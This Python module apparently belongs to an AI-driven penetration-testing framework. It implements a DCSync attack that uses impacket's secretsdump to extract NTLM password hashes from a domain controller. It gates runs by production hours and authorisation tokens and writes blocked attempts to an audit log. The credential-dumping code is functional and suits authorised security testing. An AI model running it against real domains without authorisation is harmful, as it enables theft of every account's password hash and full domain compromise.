"""
DCSync module.

FR-ATK-05 | MITRE T1003.006
Performs DC Sync to extract NTLM hashes via replication protocol.
Read-only (justDCNTLM=True — no writes).

Edge case: DCSync against live DC in production hours (08:00–20:00) requires
an explicit time-window authorisation token.
"""

from __future__ import annotations

from datetime import datetime

from aiptt.attacks.base import AbstractAttackModule, AttackResult
from aiptt.audit.logger import get_audit_logger


class Module(AbstractAttackModule):
    module_id       = "AD-DCSYNC-001"
    mitre_technique = "T1003.006"
    destructive     = False    # Read-only replication — no writes to target
    sandboxable     = True

    PRODUCTION_HOURS = range(8, 20)   # 08:00–20:00 local time

    def preflight(self, target: str, parameters: dict) -> bool:
        """
        Block DCSync during production hours unless a valid time-window
        authorisation token is provided (FR-ATK-05 edge case).
        """
        current_hour = datetime.now().hour
        if current_hour in self.PRODUCTION_HOURS:
            token = parameters.get("production_auth_token", "")
            if not token or not self._validate_token(token):
                get_audit_logger().log_event(
                    "DCSYNC_BLOCKED_PRODUCTION_HOURS",
                    target=target,
                    hour=current_hour,
                )
                return False
        return True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip    = parameters.get("dc_ip", target)
        domain   = parameters.get("domain", "")
        username = parameters.get("username", "")
        nt_hash  = parameters.get("nt_hash", "")
        lm_hash  = parameters.get("lm_hash", "")

        if not domain or not username:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "domain and username are required")

        try:
            from impacket.examples import secretsdump  # type: ignore

            dumper = secretsdump.DumpSecrets(
                remoteName=dc_ip,
                username=username,
                password="",
                domain=domain,
                lmhash=lm_hash,
                nthash=nt_hash,
                aesKey="",
                doKerberos=False,
                history=False,
                noLMHash=True,
                remoteOps=None,
                useVSSMethod=False,
                justDCNTLM=True,   # NTLM only — minimal impact
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
            )
            dumper.dump()
            hashes = getattr(dumper, "getHashesDumped", lambda: [])()

            return AttackResult(
                success=True,
                outcome="SUCCESS",
                gained_access=False,
                access_level="none",
                output=f"Dumped {len(hashes)} NTLM hashes from {dc_ip}",
                credentials_captured=[
                    {
                        "type":   "ntlm_hash",
                        "domain": domain,
                        "count":  len(hashes),
                    }
                ],
            )

        except ImportError:
            return AttackResult(False, "IMPACKET_MISSING", False, "none",
                                "impacket is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))

    def _validate_token(self, token: str) -> bool:
        """Check for valid production-hours authorisation token in DB."""
        try:
            from aiptt.storage.db import get_session
            from aiptt.storage.models import AuthorisationToken
            with get_session() as s:
                t = s.query(AuthorisationToken).filter_by(
                    token=token, purpose="dcsync_production").first()
                return t is not None and not t.is_expired()
        except Exception:
            return False
